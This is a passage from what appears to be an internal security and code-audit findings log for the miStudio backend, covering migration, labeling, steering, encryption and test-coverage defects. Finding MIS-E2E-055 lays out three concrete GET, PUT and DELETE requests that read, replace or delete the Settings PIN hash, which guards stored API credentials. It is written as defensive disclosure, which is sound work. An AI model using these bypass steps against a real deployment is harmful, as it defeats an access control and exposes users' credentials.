- **Claim:** Both files declare an `$id` on the internal `hitsai.net` domain. These two files are **deliberately kept in the public mirror** (the `sync-to-clean` filter explicitly preserves `docs/schemas/`), so the internal domain ships publicly — and `$id` is precisely the field external validators attempt to **resolve**, so third-party tooling may generate outbound traffic to that host. Both `description` fields also name internal repo test paths (`backend/tests/unit/test_*_schema_sync.py`).
- **Failure scenario:** Low impact, high certainty. Discloses the internal domain and invites resolution attempts against it from anyone validating a miStudio document.
- **Evidence:** verified-by-live-repro (both lines read; the sync filter's preservation of `docs/schemas` confirmed at `sync-to-clean.yml:38-44`)
- **Doc reference:** memory `user-email-and-domains`; MIS-E2E-009 (same class, frontend)
- **Verification (R3):** pending — confirm against the public mirror's copy
- **Proposed remediation:** Use a public URL, or a URN that is not resolvable. Change it before the next mirror push.
- **Effort:** S

---

### MIS-E2E-045 — Two migrations overwrite system templates, discarding user edits, with a `pass` downgrade
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/alembic/versions/n1o2p3q4r5s6…:91-97`; `backend/alembic/versions/o2p3q4r5s6t7…:104-110`
- **Claim:** Both overwrite `system_message` and `user_prompt_template` matched on `name`, with **no `is_system` guard**. A user who edited a template that happens to share a name loses those edits at upgrade. `downgrade()` is `pass` in both. They do correctly use `bindparams`, so there is no injection.
- **Failure scenario:** Intentional seeding that is lossy for the user. Labeling prompt templates are user-authorable, and the match key is a name, not an ownership flag.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-21 (Context-Aware Labeling Template Strategy)
- **Verification (R3):** pending
- **Proposed remediation:** Guard on `is_system = true`.
- **Effort:** S

---

### MIS-E2E-046 — Deleting a training destroys user-curated feature data with no gate
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** debt
- **Location:** the CASCADE chain across `features`, `feature_activations`, `feature_analysis_cache`, `feature_dashboard_data`, `enhanced_labeling_jobs`, `feature_group_members`
- **Claim:** Migrations and ORM **agree** here — this is not a divergence, it is a design consequence. Deleting a training cascades to features, and features carry **user-curated** data: hand-edited labels, `notes`, `is_favorite`, and `star_color` — including the aqua state that PPRD §2.3 defines as *"completed, permanent, protected from bulk overwrite"*. One `DELETE /api/v1/trainings/{id}` destroys all of it, along with the two-pass LLM synthesis output. There is no soft delete, no export gate, and no confirmation of what will be lost.
- **Failure scenario:** Hours of curation vanish behind one unauthenticated DELETE. The product explicitly promises aqua stars are protected from bulk overwrite; nothing protects them from this.
- **Evidence:** verified-by-live-repro (FK delete rules read from both sides and confirmed to agree)
- **Doc reference:** PPRD §2.3 (star-colour state machine, "protected from bulk overwrite")
- **Verification (R3):** pending
- **Proposed remediation:** Report what would be destroyed before destroying it — a prune-preview, exactly as `GET /trainings/{id}/checkpoints/prune-preview` already does for checkpoints. That precedent exists in this codebase.
- **Effort:** M

---

### MIS-E2E-047 — Two template-seeding migrations build SQL by f-string with unescaped numerics
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/alembic/versions/90faea1e38d0…:63-75`, `backend/alembic/versions/9dc725cba2ad…:58-70`
- **Claim:** Both build SQL by f-string from a JSON file on disk. String fields pass through a hand-rolled `escape_sql` that only doubles single quotes; `temperature`, `max_tokens` and `max_examples` are interpolated with **no escaping at all**. The source is a repo-controlled file (`src/data/templates/anthropic_style.json`), so it is **not remotely exploitable** — recorded as the one genuine string-built-SQL pattern in a tree that is otherwise entirely parameterized.
- **Failure scenario:** None today. It becomes a real vector the moment anyone makes the template source user-supplied, and a hand-rolled `escape_sql` reads as a sanctioned pattern to the next author.
- **Evidence:** verified-by-live-repro (read; source traced to a repo file)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Use `bindparams`, as every other data-bearing migration in the tree already does.
- **Effort:** S

---

### MIS-E2E-048 — A schema-audit script reports "all models match the database" while checking only column names
- **Phase / Round:** P01 / R1
- **Source:** /review
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/check_migrations.py:18-64`, and its final message
- **Claim:** The script compares `information_schema.columns` against `table.columns` — **column names only**. It never queries `pg_constraint`, never inspects foreign keys, unique constraints or indexes. It then prints:
  ```
  ================================================================================
  ✅ No migration gaps found! All models match the database schema.
  ================================================================================
  ```
  It printed exactly that during this audit, on a database where **five constraint divergences are provably present** — the three missing foreign keys of MIS-E2E-033 and the two ORM-absent unique constraints of MIS-E2E-031.
- **Failure scenario:** This is the fail-open shape, in the tool built to detect drift. Its conclusion ("all models match the database schema") is far broader than its method ("the column names are the same"), so anyone who runs it — the sibling `audit_migrations.py` explicitly recommends it as *"the authoritative check"* — is told the schema is correct when it is not. A guard whose claim exceeds its check is worse than no guard.
- **Evidence:** verified-by-live-repro — script executed against `mistudio-postgres`; green output captured; the same database queried directly for `pg_constraint` and found divergent
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Either narrow the claim to what it checks ("column names match"), or extend it to constraints and indexes. Then wire it into CI — an unrun check cannot drift-detect anything. Note the same rule fixes MIS-E2E-031/033: a `Base.metadata` vs live-schema diff covering constraints would catch all five at once.
- **Effort:** M

---

### MIS-E2E-049 — A sibling audit script contradicts it, via a regex that truncates every `create_table`
- **Phase / Round:** P01 / R1
- **Source:** /review
- **Severity:** P3
- **Type:** bug
- **Location:** `backend/find_column_gaps.py:38` — `re.finditer(r'op\.create_table\s*\(\s*["\'](\w+)["\']([^)]+\))+', content, re.DOTALL)`
- **Claim:** The two unowned scripts give opposite answers about the same schema. `check_migrations.py` says no gaps; `find_column_gaps.py` reports eleven `trainings` columns as *"not found in migrations"* — `celery_task_id`, `checkpoint_dir`, `completed_at`, `started_at`, `logs_path`, the four `current_*` live stats, and both error columns. **All eleven exist**, both in the database and in `5523f486e7f0_create_training_tables.py`. The cause is the `[^)]+` in the capture group: it stops at the **first** `)`, which is the end of the first `sa.Column(...)` call, so only the opening column or two of any `create_table` block is ever scanned. Columns added later by `op.add_column` are matched fine — which is why the false positives cluster on tables created whole.
- **Failure scenario:** The script cries wolf on every large `create_table`, which is why nobody runs it, which is why its sibling's fail-open green (MIS-E2E-048) is the one that gets believed. Recorded as its own finding because the two scripts *disagreeing* is the observable symptom, and a maintainer comparing them would reasonably conclude the green one is right.
- **Evidence:** verified-by-live-repro — both scripts executed; `celery_task_id` confirmed present in the DB and at `5523f486e7f0_create_training_tables.py:53`; the regex mechanism read
- **Doc reference:** PADR IDL-16
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Delete it, or rewrite it against the alembic API rather than against source text. This is the third source-scrape guard in this codebase's history to fail on an unexpected layout; the standing lesson says read the registry, not the source.
- **Effort:** S
- **Related:** MIS-E2E-022 (the four scripts are unowned), MIS-E2E-048

---

### MIS-E2E-050 — The documented data model omits 11 of 38 tables, including one its own diagram draws
- **Phase / Round:** P01 / R1
- **Source:** /review
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `manual/docs/reference/data-model.md` (115 lines, last touched 2026-07-26)
- **Claim:** The page documents 17 tables across "Pipeline", "Feature", "Circuit & cluster" and "Job & support" sections. The database has 38. Eleven are never described anywhere on the page: `checkpoints`, `feature_groups`, `feature_group_members`, `feature_grouping_runs`, `feature_token_index`, `feature_analysis_cache`, `feature_dashboard_data`, `agent_approval_requests`, `dismissed_operations`, `alembic_version`, `feature_activations_default`.
- **Failure scenario:** Three of these matter. (1) **`checkpoints` is drawn in the page's own Mermaid ER diagram** at line 18 (`trainings ||--o{ checkpoints`) and then has no section and no table row — a reader who follows the diagram to look it up finds nothing, on the page that *does* document `trainings.finalized_from_step` and links to the checkpoint-lifecycle guide. (2) The **entire Clusters subsystem** is undocumented — `feature_groups`, `feature_group_members`, `feature_grouping_runs`, `feature_token_index` back three shipped features (PPRD rows 13–15) and the whole Feature Groups panel. (3) **`agent_approval_requests`** is the MCP approval gate — the table behind the mechanism that decides whether an agent's destructive action needs a human, absent from the data-model reference.
- **Evidence:** verified-by-live-repro — live `pg_tables` list diffed against every backticked identifier on the page
- **Doc reference:** self; PADR IDL-26 (MCP approvals), IDL-28/29/30 (clusters)
- **Verification (R3):** pending
- **Proposed remediation:** Add the missing tables. Then add a doc test that diffs `Base.metadata.tables` against the identifiers the page mentions — the same derive-from-the-registry rule as MIS-E2E-048, applied to documentation.
- **Effort:** M

---

## P01 — R2 (adversarial re-review + mutation controls)

---

### MIS-E2E-051 — The startup schema validator has zero tests and its result is discarded
- **Phase / Round:** P01 / R2
- **Source:** mutation control M2
- **Severity:** P2
- **Type:** test-gap
- **Location:** `backend/src/db/schema_validator.py` (whole module); `backend/src/main.py:42-54`
- **Claim:** Removing `"models"` from `REQUIRED_TABLES` left **155 tests green**. Investigating why: **no test file anywhere references `schema_validator`, `REQUIRED_TABLES` or `validate_schema`** — the module is entirely untested. It has exactly one production caller, `main.py:45`, and `main.py:46-51` uses the boolean only to emit `logger.warning`; the surrounding `except` at `:52` continues startup on any error, commented *"Continue startup even if validation fails to avoid blocking deployment."*
- **Failure scenario:** The mechanism is non-blocking **by design** — `validate_schema_on_startup`'s docstring calls it *"a softer check that logs warnings but doesn't crash the application"*, which is a defensible choice. The finding is the combination: a check that covers 15 of 36 tables (MIS-E2E-032), reports success on a broken database, is never exercised by a test, and whose result nothing acts on. Each property alone is arguable; together they mean the schema validation subsystem provides no assurance whatsoever, while its startup log line says it does.
- **Evidence:** **verified-by-mutation** — M2 landed (`git diff --stat` confirmed 1 deletion), suite green, restore verified clean. Plus a grep proving zero test references.
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Test it, or delete it. If it stays: derive `REQUIRED_TABLES` from `Base.metadata` (MIS-E2E-032), add a test that fails when the list shrinks, and decide deliberately whether a missing table should block startup.
- **Effort:** M

---

### MIS-E2E-052 — Any field can be dropped on circuit import and the suite stays green
- **Phase / Round:** P01 / R2
- **Source:** mutation control M3
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/api/v1/endpoints/circuits.py:190-205` (the import dict); no round-trip test exists
- **Claim:** Deleting `"faithfulness"` from the dict the import endpoint passes to `CircuitService.create` — the **exact shape** of the real calibration bug in MIS-E2E-037 — left every circuit test green.
- **Failure scenario:** This is the systemic cause behind MIS-E2E-037, and it reframes that finding. Calibration is not missing because someone made a one-off typo; it is missing because **the import path has no round-trip protection of any kind**, so the field simply never had to be there. Confirmed at source: `CircuitService.create` reads `data.get("calibration")` (`circuit_service.py:224`) and the endpoint's dict has no such key, while every other contract field — `saes`, `members`, `edges`, `budget`, `faithfulness`, `discovery` — is passed. The service is fully wired to carry calibration; only the caller omits it. The next field added to the contract will be dropped the same way, silently.
- **Evidence:** **verified-by-mutation** — M3 landed (2 lines deleted, confirmed), `tests/unit -k circuit` green, restore verified clean
- **Doc reference:** PADR IDL-33 clause 6 (round-trip discipline); BR-013 round-trip
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** One test: build a maximal `CircuitDefinitionV1` with every optional block populated, import it, export it, assert **document equality**. That single test fails for calibration today and would have failed for any of the other five. Field-by-field assertions are the weaker form — they only cover the fields someone remembered.
- **Effort:** S
- **Related:** MIS-E2E-037 (the instance), this (the cause)

---

### MIS-E2E-053 — No test exercises any delete cascade
- **Phase / Round:** P01 / R2
- **Source:** mutation control M5
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/models/feature.py` (3 `ondelete="CASCADE"` declarations); the suite generally
- **Claim:** Flipping **all three** CASCADE declarations on the `Feature` model to RESTRICT left **211 tests green**. Nothing anywhere asserts that deleting a parent removes its children, or that it is refused when it should be.
- **Failure scenario:** This explains MIS-E2E-033. Three foreign keys are declared on ORM models and absent from the production database; the suite could not possibly have caught that, because it never exercises a cascade — and it builds its own test schema from those same ORM declarations, so the constraints it does not test are also the only ones it has. It equally explains why MIS-E2E-046 (a training delete destroying curated labels, notes and aqua stars) has no protective test: the destructive path is unexercised in both directions. Deletion is the one operation in this product that cannot be undone, and it is the one with no coverage.
- **Evidence:** **verified-by-mutation** — M5 landed (3 replacements, `git diff --stat` confirmed), suite green, restore verified clean
- **Doc reference:** PADR IDL-16; PPRD §2.3 (aqua stars "protected from bulk overwrite")
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Integration tests against a **migrated** database, not a `create_all` one — insert a parent and children, delete the parent, assert what survives. Running them against the migrated schema is the point: it is the only way a test can see the divergence in MIS-E2E-033.
- **Effort:** M

---

### MIS-E2E-054 — `datetime.utcnow()` is deprecated and used at 37 sites
- **Phase / Round:** P01 / R2
- **Source:** adversarial re-review of R1's datetime judgement
- **Severity:** P3
- **Type:** debt
- **Location:** 37 call sites across 13 files in `backend/src/`, including the `default=` and `onupdate=` of the naive `created_at`/`updated_at` columns on `circuits`, `cluster_profiles`, `validation_manifests`, `circuit_capture_runs` and `steering_record_runs`
- **Claim:** The backend runs Python 3.12.3, where `datetime.datetime.utcnow()` is deprecated and scheduled for removal. The test suite already emits the warning. Every naive timestamp column in the circuits/clusters/manifests family is defaulted by it.
- **Failure scenario:** No behaviour change today — `utcnow()` returns naive UTC, which is exactly what these `timestamp without time zone` columns want. The risk is the migration: the obvious replacement `datetime.now(datetime.UTC)` returns an **aware** datetime, and asyncpg raises a `DataError` on an aware value bound to a `timestamp without time zone` column — a failure this codebase has already live-reproduced as a 500 (the comment at `circuit_service.py:246-247` records it). So the mechanical fix breaks these five tables, and the safe replacement is `datetime.now(timezone.utc).replace(tzinfo=None)`.
- **Evidence:** verified-by-live-repro — 37 sites counted; `python -V` = 3.12.3; DeprecationWarnings observed in the baseline run
- **Doc reference:** none
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** One helper (`utc_naive()`), applied at all 37 sites, so the correct form is written once. Do not do this as a find-and-replace to `datetime.now(UTC)`.
- **Effort:** M

---

## P02 — Backend services

---

### MIS-E2E-055 — The Settings PIN can be read, rewritten and deleted through the settings routes it guards
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/settings.py:100` (`is_sensitive=False`), `:138` (`PUT /settings`, no key guard), `:195` (`DELETE /settings/{key}`), `:36` (`_PIN_HASH_KEY = "settings_pin_hash"`)
- **Claim:** The PIN is stored as an ordinary settings row under a known key, and the generic settings routes have no allowlist. Three independent bypasses of the same gate:
  1. **Read it.** `_hash_pin` output is written with `is_sensitive=False`. Masking in `list_settings`/`get_setting` is conditional on `is_sensitive`, so `GET /settings/settings_pin_hash` — or just `GET /settings?category=system` — returns the **PBKDF2 salt and hash in the clear**. The PIN space is four digits: 10,000 candidates, offline, instant.
  2. **Rewrite it.** `PUT /settings` validates only that `data.key in _URL_VALIDATED_KEYS` (two URL keys) and otherwise upserts anything. `PUT {"key":"settings_pin_hash","value":"<hash of a PIN I choose>"}` replaces the PIN, bypassing the `current_pin` check that `/pin/set` performs at `:91-93`.
  3. **Delete it.** `DELETE /settings/settings_pin_hash` removes the row; `/pin/set` then reads `existing = None` at `:88` and its `if existing and not settings.bypass_settings_pin` guard is skipped, so a new PIN can be set with no current PIN at all.
- **Failure scenario:** This is **not** covered by the accepted no-app-auth posture (MIS-E2E-002). The PIN's entire threat model is to gate the Settings panel — where the OpenAI and HuggingFace credentials live — from someone who *already has network access*. That is precisely the population the nginx/LAN boundary admits. The gate is defeated by three of the routes sitting beside it, and route (1) needs no write at all.
- **Evidence:** **verified-by-live-repro at source** — all four line ranges read and quoted; the masking condition, the absent allowlist and the `existing is None` path each confirmed
- **Doc reference:** PADR IDL-25 (Settings Panel PIN Protection), IDL-20
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Store the PIN outside the generic settings table, or deny `settings_pin_hash` (and any future gate key) in `PUT`, `PUT /bulk`, `DELETE` and the two `GET`s. Marking it `is_sensitive=True` fixes only bypass (1). The general lesson: a gate must not be stored in the thing it gates.
- **Effort:** M
- **Supersedes in part:** MIS-E2E-005 — that finding said the PIN protects nothing it appears to protect; this is the mechanism, and it is worse than "not enforced".

---

### MIS-E2E-056 — After a key change, ciphertext is sent to OpenAI as a bearer token
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/core/encryption.py:97` (the fail-open return); consumer `OpenAILabelingService`
- **Claim:** `decrypt_value` swallows `InvalidTag` and returns the stored value unchanged (MIS-E2E-004). This finding is the **consequence**, which MIS-E2E-004 did not trace: if `SETTINGS_ENCRYPTION_KEY` or `secret_key` changes — a rotation, a redeploy with a regenerated secret, a different environment — every stored API key fails authentication and is returned as **raw base64 ciphertext**, which is then handed to `OpenAILabelingService` and transmitted to `api.openai.com` in an `Authorization: Bearer` header.
- **Failure scenario:** Encrypted credential material leaves the network boundary and reaches a third party in a request header, because the decryption failure was designed to be invisible. The user sees an authentication error from OpenAI and reasonably concludes the key is wrong — the actual event is that their ciphertext was just transmitted. No log line distinguishes this from a genuinely bad key.
- **Evidence:** plausible (read-only) — the fail-open path is verified; the transmission is traced through the consumer, not executed
- **Doc reference:** PADR IDL-20, IDL-19 (OpenAI SDK as standard client)
- **Verification (R3):** pending — trace the exact header construction
- **Proposed remediation:** Raise on `InvalidTag`. This is the third finding rooting in the same swallow (MIS-E2E-004 integrity, MIS-E2E-041 permanent plaintext, this) — fix once.
- **Effort:** S
- **Related:** MIS-E2E-004, MIS-E2E-041

---

### MIS-E2E-057 — Cancelling a labeling job can never be observed
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:610` (`_raise_if_cancelled`)
- **Claim:** `_raise_if_cancelled` re-queries `LabelingJob` on a session configured `expire_on_commit=False`. SQLAlchemy returns the **identity-mapped object already in the session**, not fresh database state, so a status written by another connection is never seen. The reviewer verified this empirically on SQLAlchemy 2.0.45.
- **Failure scenario:** The user presses Cancel; the API writes `CANCELLED`; the running job never observes it, labels every remaining feature, and on completion writes `COMPLETED` **over** the cancel. That is the exact production symptom the cancel feature was built to fix. **Why no test catches it:** the existing test's fake `_Session` returns a fresh row on every call — it has no identity map, so the fixture cannot exhibit the behaviour under test. Fixtures agreeing by construction, again.
- **Evidence:** verified-by-live-repro (reviewer executed against SQLAlchemy 2.0.45)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** `await db.refresh(job)` or `session.expire(job)` before the read, or query with `populate_existing()`. The test needs a real session, not a fake without an identity map.
- **Effort:** S

---

### MIS-E2E-058 — A cancelled labeling job is reported as failed
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:1483`; `backend/src/workers/labeling_tasks.py:92`
- **Claim:** `_LabelingCancelled` is caught by the outer `except Exception`, which sets `status=FAILED` and emits `labeling:failed` before re-raising. `labeling_tasks.py:92` carries a comment asserting *"the job row is already CANCELLED"* — it is not; it was just overwritten to FAILED.
- **Failure scenario:** A deliberate user cancellation surfaces in the UI as a failure, and the comment documenting the opposite means the next reader will not look. (Only reachable once MIS-E2E-057 is fixed — today the cancellation is never raised at all.)
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Catch `_LabelingCancelled` before the generic handler.
- **Effort:** S

---

### MIS-E2E-059 — The documented no-template fallback path raises `UnboundLocalError`
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:906`, `:1056`, `:1255`; binding site inside `if template:`
- **Claim:** `job_batch_size` is assigned only inside the `if template:` branch and read unconditionally at three later points. The "no template found" path is explicitly supported, and it dies with `UnboundLocalError`.
- **Failure scenario:** A labeling run started against a deleted or missing template crashes with a Python error rather than falling back, at three separate sites. The crash surfaces as a generic 500 / FAILED job.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Bind the default before the branch.
- **Effort:** S

---

### MIS-E2E-060 — Per-job `max_tokens` is silently overwritten by the template's
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:1046`
- **Claim:** `max_tokens` is exposed on the API and in the UI as a per-job setting, and is then unconditionally replaced by `template.max_tokens` (default **50**). The sibling `max_examples` gets the precedence right; `max_tokens` does not.
- **Failure scenario:** A user raises `max_tokens` to get longer feature descriptions, the value is accepted, and every description is still truncated at the template default. The control appears to work and does nothing — and this is the same class as the J-Lens arc's "a remedy string naming a control that does not do what it says".
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-18 (enhanced labeling)
- **Verification (R3):** pending
- **Proposed remediation:** Mirror the `max_examples` precedence: job value wins, template is the default.
- **Effort:** S

---

### MIS-E2E-061 — Three smaller defects in the labeling and encryption paths
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P3
- **Type:** bug
- **Location:** `labeling_service.py:1202` and `:1407`; `labeling_service.py:720`; `core/encryption.py:126`
- **Claim:** Three independent minor defects, grouped because each is a one-line fix:
  1. **`finally` masks the real error.** Both `finally` blocks dereference `labeling_service`, which is unbound if the `OpenAILabelingService` constructor raises — so a construction failure surfaces as `UnboundLocalError` and the actual cause is lost.
  2. **Explicit null batch size crashes.** `"batch_size": null` in a request survives `.get(key, default)` as `None` (the default only applies to a *missing* key) and reaches `range(0, n, None)` → `TypeError`.
  3. **`mask_value` reveals short secrets.** For a 4–7 character value it emits every character — `"abcd"` masks to `"abc...abcd"`. The docstring's own example is also wrong.
- **Failure scenario:** (3) is the one with security relevance, though bounded: any secret short enough to be fully revealed by the mask is short enough to be low-value. Recorded because `mask_value` is the function the UI trusts to not show a credential.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Bind before `try`; treat `None` as absent; make `mask_value` reveal a fixed suffix only above a minimum length, and fix the docstring.
- **Effort:** S

---

### MIS-E2E-062 — The entire steering resilience layer is unreachable; `/steering/status` is always "healthy"
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** **P0** *(per this audit's rubric: "a capability the product claims to ship that is unreachable in production")*
- **Type:** reachability
- **Location:** `backend/src/services/steering_resilience.py` (508 lines — circuit breaker, concurrency limiter, process isolation); consumers `backend/src/api/v1/endpoints/steering.py:158` (`GET /steering/status`) and `:193` (`POST /steering/reset`)
- **Claim:** The module implements a circuit breaker with failure thresholds and CLOSED/OPEN/HALF_OPEN states, a concurrency limiter, and process isolation. **Not one of its state-mutating functions has a caller.** Verified by grepping `backend/src` *and* `backend/tests`:
  ```
  can_execute              callers outside the module: 0
  try_acquire              callers outside the module: 0
  record_success           callers outside the module: 0
  record_failure           callers outside the module: 3  ← all false positives
  execute_with_isolation   callers outside the module: 0
  ```
  The three `record_failure` hits are an **unrelated method of the same name** on `EdgeEvidence` in `schemas/evidence_ladder.py:71` and its two tests. A name collision, not a caller. The endpoint imports only the *getters*: `get_circuit_breaker`, `get_concurrency_limiter`, `get_process_isolation`, `get_resilience_status`, `reset_resilience`.
- **Failure scenario:** `_failure_count` is initialised to 0 at `:76` and incremented only in `record_failure`, which nothing calls. `_state` is initialised CLOSED at `:75` and leaves CLOSED only inside the same dead function. Therefore `GET /steering/status` computes `"healthy" if resilience["circuit_breaker"]["state"] == "closed"` and **can only ever return "healthy"** — no matter how many steering tasks have failed. `POST /steering/reset` resets state that was never non-default: a no-op that reports success. The endpoint's own docstring says *"Use this endpoint to monitor steering health and diagnose issues."* An operator diagnosing a steering outage is told the service is healthy, by design, always.
- **Evidence:** **verified-by-live-repro** — caller grep over `src` and `tests`, the three hits individually resolved to a name collision, the state-transition sites read
- **Doc reference:** none — and that is part of the finding; `CLAUDE.md`'s Reachability gate says *"A capability is not shipped until a test FAILS when its wiring is removed."* Nothing here can be unwired, because nothing is wired.
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Either wire it — `record_failure` on the steering task's exception path, `try_acquire` around dispatch — or delete the module and make `/steering/status` report what it can actually observe. Shipping a health endpoint that is a constant is worse than not shipping one. Then apply the repo's own rule: delete the wiring line and require a red.
- **Effort:** M
- **Note:** This is the same shape as the 16 unregistered `millm_circuit_*` MCP tools that `backend/tests/unit/test_reachability.py` was written to prevent. That harness guards the MCP surface only; nothing guards the service layer.

---

### MIS-E2E-063 — Coherence and behavioral scores are a hardcoded 0.5 presented as measurements
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug *(the "wrong results presented as correct" class)*
- **Location:** `backend/src/services/steering_service.py:1568-1573`; `backend/requirements.txt`
- **Claim:** `_compute_coherence` lazily imports `sentence_transformers`, and on `ImportError` logs a warning and `return 0.5`. **`sentence-transformers` is not in `requirements.txt` or `pyproject.toml`, and is not installed in the backend venv** — confirmed: `ModuleNotFoundError: No module named 'sentence_transformers'`. So the import always fails, and every `coherence` and `behavioral_score` the product has ever reported is the literal constant `0.5`.
- **Failure scenario:** The UI renders these as measured quality scores beside real generated text. A user comparing steering strengths sees coherence 0.5 at every dial and reads it as "coherence is unaffected by strength" — a finding about the model, produced by a missing dependency. This is precisely the class the J-Lens arc's review lessons name: *evidence that is wrong rather than merely missing*. Second-order: the `except` clause catches only `ImportError`, so a non-import failure (the model's first-use download failing offline — the normal case in this deployment) propagates and aborts the whole steering request instead of degrading.
- **Evidence:** **verified-by-live-repro** — dependency files grepped, import attempted in the real venv and failed
- **Doc reference:** PPRD §3.6 (Model Steering quality metrics)
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Add the dependency, or return `None` and have the UI render "not measured". A constant must never occupy a field the user reads as a measurement. Broaden the `except` to `Exception` either way.
- **Effort:** S

---

### MIS-E2E-064 — Compare and sweep steer with the wrong SAE basis; the 015 hazard was fixed on one path
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/steering_service.py:1888` (compare/sweep), `:2402` (`sae_map[request.sae_id]`)
- **Claim:** Compare and sweep place their hook at `feature.layer` but always steer using the **request-level** SAE, discarding each feature's own `sae_id`. No endpoint validates that `feature.layer == sae.layer`. Because `d_model` is uniform across layers, the `hidden_dim != sae.d_in` shape guard **never fires** — so a feature from layer 20's dictionary is decoded through layer 12's SAE and applied at layer 20, silently, in the correct shape and the wrong basis. This is the Feature 015 multi-SAE hazard, and it was fixed for the **combined** path only.
- **Failure scenario:** Steering output that looks plausible and is meaningless — the worst failure mode for an interpretability tool, because there is no error and the number of dimensions is right. Separately at `:2402`, `sae = sae_map[request.sae_id]` raises a bare `KeyError` inside the Celery worker when no feature routes to the request-level SAE — a multi-layer circuit whose primary SAE's layer carries no steerable members, or whose members fell past the 20-feature cap.
- **Evidence:** plausible (read-only) — the code path is verified; the wrong-basis consequence is reasoned from uniform `d_model`
- **Doc reference:** PADR IDL-31 (multi-SAE cross-layer steering, per-layer SAE application); 015_FPRD
- **Verification (R3):** pending — a live steer with a cross-layer feature would settle it
- **Proposed remediation:** Route each feature through its own `sae_id`, as the combined path already does; validate `layer == sae.layer` at the endpoint. This is the "fixed one representative, never generalized" anti-pattern this repo has recorded before.
- **Effort:** M

---

### MIS-E2E-065 — A negative dial silently returns the baseline, labelled as steered
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/steering_core.py:266`
- **Claim:** The unified steering core registers hooks only `if dial > 0`. A negative dial registers **no hooks at all** and returns unmodified baseline text — which the caller records as the steered arm.
- **Failure scenario:** Negative strength is canonical in this product, not an edge case: the cluster-definition contract carries `sign ∈ {1, -1}` and a member's negative strength *is* its direction. Suppressive steering therefore produces baseline output recorded as a steered sample at that dial. In the transcript recorder (`record_steering_samples`) this writes `(dial, prompt, unsteered, steered)` rows where the two arms are byte-identical, and the whole point of that artifact is for a strong model to read the difference afterwards. A silent no-op, not an error.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-38 (one steering core); memory `cluster-member-meta-contract-rev` — "CANONICAL SIGN RULE: negative strength is already directional"
- **Verification (R3):** pending
- **Proposed remediation:** Gate on `dial != 0`, or reject a negative dial explicitly. Returning the baseline under a steered label is the one behaviour that must not be silent.
- **Effort:** S

---

### MIS-E2E-066 — Batch extraction dispatches on the loop index, stranding jobs
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/extraction_service.py:504`; `_start_next_batch_job`
- **Claim:** Batch extraction decides what to dispatch from the `enumerate` index (`position == 1`) rather than from the first job actually *created*, and `_start_next_batch_job` only ever advances to `current + 1`.
- **Failure scenario:** If the first SAE in the batch is skipped (already extracted, invalid), **nothing is dispatched at all** — the batch silently does nothing. If a middle SAE is skipped, the tail is stranded: those jobs sit queued until the 3-hour reaper closes them with a *"crashed worker"* message, which is not what happened. The diagnosis the user is handed points at infrastructure for a dispatch-arithmetic bug.
- **Evidence:** plausible (read-only)
- **Doc reference:** PPRD §3.5 (SAE Management, batch extract)
- **Verification (R3):** pending
- **Proposed remediation:** Track created job ids and dispatch the first of those; advance to the next *created* job, not `current + 1`.
- **Effort:** M

---

### MIS-E2E-067 — A failed extraction shows no reason, because the emit uses the wrong key
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/extraction_service.py:1892` (failure), `:1836` (completion)
